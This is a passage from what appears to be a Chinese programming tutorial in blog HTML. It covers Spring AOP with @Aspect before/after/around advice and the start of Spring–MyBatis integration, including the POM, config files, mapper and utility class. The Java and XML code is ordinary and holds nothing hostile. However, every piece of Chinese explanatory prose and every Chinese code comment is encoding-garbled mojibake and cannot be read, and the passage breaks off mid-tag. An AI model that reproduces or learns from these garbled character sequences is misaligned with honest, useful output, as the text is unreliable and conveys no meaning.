AOP</h3><p>æˆ‘ä»¬è¿˜æ˜¯ä»¥åˆ‡é¢ä¸ºä¾‹ï¼Œé¦–å…ˆæ˜¯é€šè¿‡æ³¨è§£å»å®ç°ä¸€ä¸ªåˆ‡é¢ç±»ï¼Œæˆ‘ä»¬å°±æ‹¿åˆšæ‰çš„ DiyAop åˆ‡é¢ç±»ä¸ºä¾‹ï¼Œç°åœ¨æ‰“ä¸Š<code>@Aspect</code>çš„æ³¨è§£</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.stoocea.log;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.annotation.Aspect;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Aspect</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DiyAop</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">before</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;before ï¼Œï¼Œï¼Œï¼Œï¼Œ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">after</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;after.......&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨ Spring é…ç½®æ–‡ä»¶ä¸­æ³¨å†Œè¿™ä¸ªåˆ‡é¢ç±»ï¼Œæˆ‘è¿™é‡Œå…¨éƒ½æ³¨å†Œäº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean id=<span class="string">&quot;after&quot;</span> class=<span class="string">&quot;com.stoocea.log.After&quot;</span>/&gt;</span><br><span class="line">&lt;bean id=<span class="string">&quot;before&quot;</span> class=<span class="string">&quot;com.stoocea.log.Before&quot;</span>/&gt;</span><br><span class="line">&lt;bean id=<span class="string">&quot;simple&quot;</span> class=<span class="string">&quot;com.stoocea.Dao.SimpleImpl&quot;</span>/&gt;</span><br><span class="line">&lt;bean id=<span class="string">&quot;diy&quot;</span> class=<span class="string">&quot;com.stoocea.log.DiyAop&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åå¼€å¯æ³¨è§£æ‰«æ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;aop:aspectj-autoproxy/&gt;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172834844.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172834844.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç„¶åæµ‹è¯•ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.stoocea.Dao.CURD;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Mytest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ApplicationContext context=<span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;beans.xml&quot;</span>);</span><br><span class="line">        CURD curdImpl= context.getBean(<span class="string">&quot;simple&quot;</span>, CURD.class);</span><br><span class="line">        curdImpl.add();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172844408.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172844408.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æˆ‘ä»¬åˆšæ‰å­¦åˆ°çš„ç”¨ç¯ç»•åˆ‡é¢å»å®ç° AOPï¼Œä¹Ÿèƒ½å¤Ÿé€šè¿‡æ³¨è§£å®ç°ï¼Œä½œç”¨ç‚¹è¿˜æ˜¯<code>DiyAop</code> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.aspectj.apache.bcel.classfile.Signature;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.ProceedingJoinPoint;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.annotation.After;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.annotation.Around;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.annotation.Aspect;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.annotation.Before;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Aspect</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DiyAop</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Before(&quot;execution(* com.stoocea.Dao.SimpleImpl.*(..))&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">before</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;before ï¼Œï¼Œï¼Œï¼Œï¼Œ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@After(&quot;execution(* com.stoocea.Dao.SimpleImpl.*(..))&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">after</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;after.......&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Around(&quot;execution(* com.stoocea.Dao.SimpleImpl.*(..))&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">around</span><span class="params">(ProceedingJoinPoint pjp)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ç¯ç»•å‰&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Object proceed=pjp.proceed();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;ç¯ç»•å&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>ProceedingJoinPoint</code>å®ƒä»£è¡¨å½“å‰çš„ä½œç”¨ç‚¹ï¼Œæˆ‘ä»¬èƒ½å¤Ÿé€šè¿‡å®ƒæ¥è·å–åˆ°å¾ˆå¤šä¿¡æ¯ï¼Œè¿™é‡Œå°±ä¸å±•ç¤ºäº†</p><p>ç„¶åä¾ç„¶æ˜¯æµ‹è¯•ç±»çœ‹çœ‹</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172854152.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172854152.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¯´æ˜å…ˆæ˜¯ç¯ç»•çš„æ‰§è¡Œï¼Œç„¶åç­‰åˆ‡å…¥ç‚¹å¼€å§‹æ‰§è¡Œçš„æ—¶å€™ï¼Œåˆ‡é¢çš„ before å’Œ after å¼€å§‹è¿ä½œï¼Œæœ€åæ•´ä¸ªæµç¨‹ç»“æŸä¹‹åå†è¿›ç¯ç»•é¢æ‰§è¡Œç¯ç»•å</p><h2 id="9-Spring-æ•´åˆ-Mybatis"><a href="#9-Spring-æ•´åˆ-Mybatis" class="headerlink" title="9 Spring æ•´åˆ Mybatis"></a>9 Spring æ•´åˆ Mybatis</h2><p>Spring çš„æœ€åä¸€æ­¥ï¼Œé¡ºä¾¿å›é¡¾ä¸€ä¸‹ mybatis çš„çŸ¥è¯†</p><h3 id="0x01-ç¯å¢ƒæ­å»º-1"><a href="#0x01-ç¯å¢ƒæ­å»º-1" class="headerlink" title="0x01 ç¯å¢ƒæ­å»º"></a>0x01 ç¯å¢ƒæ­å»º</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">&lt;project xmlns=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">  xsi:schemaLocation=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd&quot;</span>&gt;</span><br><span class="line">  &lt;modelVersion&gt;<span class="number">4.0</span><span class="number">.0</span>&lt;/modelVersion&gt;</span><br><span class="line">  &lt;groupId&gt;org.example&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;SpringRe0&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;<span class="number">1.0</span>-SNAPSHOT&lt;/version&gt;</span><br><span class="line">  &lt;packaging&gt;pom&lt;/packaging&gt;</span><br><span class="line">  &lt;name&gt;Archetype - SpringRe0&lt;/name&gt;</span><br><span class="line">  &lt;url&gt;http:<span class="comment">//maven.apache.org&lt;/url&gt;</span></span><br><span class="line">  &lt;modules&gt;</span><br><span class="line">    &lt;<span class="keyword">module</span>&gt;Spring-<span class="number">01</span>&lt;/<span class="keyword">module</span>&gt;</span><br><span class="line">    &lt;<span class="keyword">module</span>&gt;Spring-<span class="number">02</span>-HelloSpring&lt;/<span class="keyword">module</span>&gt;</span><br><span class="line">    &lt;<span class="keyword">module</span>&gt;Spring-<span class="number">03</span>-Anno&lt;/<span class="keyword">module</span>&gt;</span><br><span class="line">    &lt;<span class="keyword">module</span>&gt;Spring-<span class="number">04</span>-AOPpre&lt;/<span class="keyword">module</span>&gt;</span><br><span class="line">    &lt;<span class="keyword">module</span>&gt;Spring-<span class="number">05</span>-Conmybatis&lt;/<span class="keyword">module</span>&gt;</span><br><span class="line">  &lt;/modules&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &lt;dependencies&gt;</span><br><span class="line">    &lt;!-- https:<span class="comment">//mvnrepository.com/artifact/org.springframework/spring-core --&gt;</span></span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;spring-core&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;<span class="number">6.0</span><span class="number">.4</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;!-- https:<span class="comment">//mvnrepository.com/artifact/org.springframework/spring-beans --&gt;</span></span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;spring-beans&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;<span class="number">6.0</span><span class="number">.4</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;spring-context&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;<span class="number">6.0</span><span class="number">.4</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;mysql&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;<span class="number">8.0</span><span class="number">.30</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!--mybatis--&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.mybatis&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;mybatis&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;<span class="number">3.5</span><span class="number">.6</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- junit --&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;junit&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;junit&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;<span class="number">4.13</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.aspectj&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;aspectjrt&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;<span class="number">1.9</span><span class="number">.19</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">  &lt;/dependencies&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/project&gt;</span><br><span class="line">driver=com.mysql.cj.jdbc.Driver</span><br><span class="line">url=jdbc:mysql:<span class="comment">//localhost:3306/mybatis_study?useSSL=true&amp;seUnicode=true&amp;characterEncoding=UTF-8</span></span><br><span class="line">username=root</span><br><span class="line">password=<span class="number">123456</span></span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="line">&lt;!DOCTYPE configuration</span><br><span class="line">PUBLIC <span class="string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span><br><span class="line"><span class="string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">  &lt;properties resource=<span class="string">&quot;db.properties&quot;</span>&gt;</span><br><span class="line">    &lt;property name=<span class="string">&quot;useless&quot;</span> value=<span class="string">&quot;useless&quot;</span>/&gt;</span><br><span class="line">  &lt;/properties&gt;</span><br><span class="line">  &lt;settings&gt;</span><br><span class="line">    &lt;setting name=<span class="string">&quot;logImpl&quot;</span> value=<span class="string">&quot;STDOUT_LOGGING&quot;</span>/&gt;</span><br><span class="line">  &lt;/settings&gt;</span><br><span class="line">  &lt;typeAliases&gt;</span><br><span class="line">    &lt;<span class="keyword">package</span> name=<span class="string">&quot;com.stoocea.Pojo&quot;</span>/&gt;</span><br><span class="line">  &lt;/typeAliases&gt;</span><br><span class="line">  &lt;environments <span class="keyword">default</span>=<span class="string">&quot;development&quot;</span>&gt;</span><br><span class="line">    &lt;environment id=<span class="string">&quot;development&quot;</span>&gt;</span><br><span class="line">      &lt;transactionManager type=<span class="string">&quot;JDBC&quot;</span>&gt;&lt;/transactionManager&gt;</span><br><span class="line">      &lt;dataSource type=<span class="string">&quot;POOLED&quot;</span>&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;driver&quot;</span> value=<span class="string">&quot;$&#123;driver&#125;&quot;</span>&gt;&lt;/property&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;url&quot;</span> value=<span class="string">&quot;$&#123;url&#125;&quot;</span>&gt;&lt;/property&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;username&quot;</span> value=<span class="string">&quot;$&#123;username&#125;&quot;</span>&gt;&lt;/property&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;password&quot;</span> value=<span class="string">&quot;$&#123;password&#125;&quot;</span>&gt;&lt;/property&gt;</span><br><span class="line">      &lt;/dataSource&gt;</span><br><span class="line">    &lt;/environment&gt;</span><br><span class="line">  &lt;/environments&gt;</span><br><span class="line">  &lt;mappers&gt;</span><br><span class="line">    &lt;mapper resource=<span class="string">&quot;com/stoocea/Mapper/UserMapper.xml&quot;</span>/&gt;</span><br><span class="line">  &lt;/mappers&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure><p>UserMapper æ¥å£</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.stoocea.Mapper;</span><br><span class="line"><span class="keyword">import</span> com.stoocea.Pojo.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line">    List&lt;User&gt; <span class="title function_">getuserlist</span><span class="params">()</span>;</span><br><span class="line">    <span class="comment">//æ ¹æ®IDè¿”å›æ•°æ®</span></span><br><span class="line">    User <span class="title function_">getuserbyname</span><span class="params">(String name)</span>;</span><br><span class="line">    <span class="comment">//æ·»åŠ ç”¨æˆ·</span></span><br><span class="line">    Boolean <span class="title function_">adduser</span><span class="params">(User user)</span>;</span><br><span class="line">    <span class="comment">//åˆ é™¤ç”¨æˆ·</span></span><br><span class="line">    Boolean <span class="title function_">deluser</span><span class="params">(<span class="type">int</span> id)</span>;</span><br><span class="line">    <span class="comment">//æ›´æ–°ç”¨æˆ·</span></span><br><span class="line">    Boolean <span class="title function_">cguser</span><span class="params">(User user)</span>;</span><br><span class="line">    <span class="comment">//æ·»åŠ ç”¨æˆ·Map</span></span><br><span class="line">    Boolean <span class="title function_">mapadduser</span><span class="params">(Map&lt;String,Object&gt; map)</span>;</span><br><span class="line">    <span class="comment">//æ¨¡ç³ŠæŸ¥è¯¢</span></span><br><span class="line">    User <span class="title function_">getuserbylike</span><span class="params">(Map&lt;String,Object&gt; map)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>UserMapper xml æ–‡ä»¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="line">&lt;!DOCTYPE mapper PUBLIC <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span><br><span class="line">        <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span><br><span class="line">&lt;mapper namespace=<span class="string">&quot;com.stoocea.Mapper.UserMapper&quot;</span>&gt;</span><br><span class="line">    &lt;select id=<span class="string">&quot;getuserlist&quot;</span> resultType=<span class="string">&quot;User&quot;</span>&gt;</span><br><span class="line">        select * from users</span><br><span class="line">    &lt;/select&gt;</span><br><span class="line">    &lt;!--è¡¥å……ä¸€ä¸ªgetuserbyidçš„selectæ ‡ç­¾--&gt;</span><br><span class="line">    &lt;select id=<span class="string">&quot;getuserbyname&quot;</span> resultType=<span class="string">&quot;User&quot;</span> parameterType=<span class="string">&quot;String&quot;</span>&gt;</span><br><span class="line">        select * from users where username=#&#123;name&#125;</span><br><span class="line">    &lt;/select&gt;</span><br><span class="line">    &lt;insert id=<span class="string">&quot;adduser&quot;</span> parameterType=<span class="string">&quot;User&quot;</span>&gt;</span><br><span class="line">        insert into mybatis.users(id,username,pwd) values(#&#123;id&#125;,#&#123;name&#125;,#&#123;pwd&#125;);</span><br><span class="line">    &lt;/insert&gt;</span><br><span class="line">    &lt;delete id=<span class="string">&quot;deluser&quot;</span> parameterType=<span class="string">&quot;int&quot;</span>&gt;</span><br><span class="line">        delete from users where id=#&#123;id&#125;</span><br><span class="line">    &lt;/delete&gt;</span><br><span class="line">    &lt;update id=<span class="string">&quot;cguser&quot;</span> parameterType=<span class="string">&quot;User&quot;</span>&gt;</span><br><span class="line">        update users set username=#&#123;name&#125;,pwd=#&#123;pwd&#125; where id=#&#123;id&#125;</span><br><span class="line">    &lt;/update&gt;</span><br><span class="line">    &lt;insert id=<span class="string">&quot;mapadduser&quot;</span> parameterType=<span class="string">&quot;Map&quot;</span>&gt;</span><br><span class="line">        insert into <span class="title function_">users</span><span class="params">(id,username)</span> values(#&#123;id&#125;,#&#123;name&#125;)</span><br><span class="line">    &lt;/insert&gt;</span><br><span class="line">    &lt;select id=<span class="string">&quot;getuserbylike&quot;</span> parameterType=<span class="string">&quot;Map&quot;</span> resultType=<span class="string">&quot;User&quot;</span>&gt;</span><br><span class="line">        select * from users where username like <span class="title function_">concat</span><span class="params">(<span class="string">&quot;%&quot;</span>,#&#123;name&#125;,<span class="string">&quot;%&quot;</span>)</span></span><br><span class="line">    &lt;/select&gt;</span><br><span class="line">&lt;/mapper&gt;</span><br></pre></td></tr></table></figure><p>è·å– mybatis  sqlssession çš„å·¥å…·ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.ibatis.io.Resources;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSession;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSessionFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSessionFactoryBuilder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MybatisUtil</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> SqlSessionFactory sqlSessionFactory;    <span class="comment">//æå‡ä½œç”¨åŸŸ</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//è·å–sqlsessionFactoryå¯¹è±¡ è¿™ä¸€æ­¥æ˜¯å¿…é¡»çš„</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">resource</span> <span class="operator">=</span> <span class="string">&quot;mybatis-config.xml&quot;</span>;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Resources.getResourceAsStream(resource);</span><br><span class="line">            sqlSessionFactory = <span class="keyword">new</span> <span class="title class_">SqlSessionFactoryBuilder</span>().build(inputStream);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//æ—¢ç„¶æœ‰äº† SqlSessionFactoryï¼Œé¡¾åæ€ä¹‰ï¼Œæˆ‘ä»¬å¯ä»¥ä»ä¸­è·å¾— SqlSession çš„å®ä¾‹ã€‚SqlSession æä¾›äº†åœ¨æ•°æ®åº“æ‰§è¡Œ SQL å‘½ä»¤æ‰€éœ€çš„æ‰€æœ‰æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> SqlSession <span class="title function_">getSqlsession</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sqlSessionFactory.openSession(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>User ç±»å°±ä¸è´´äº†</p><p>æœ€åæ˜¯æµ‹è¯•ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.stoocea.Mapper.UserMapper;</span><br><span class="line"><span class="keyword">import</span> com.stoocea.Pojo.*;</span><br><span class="line"><span class="keyword">import</span> com.stoocea.Utils.MybatisUtil;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSession;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSessionFactory;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span 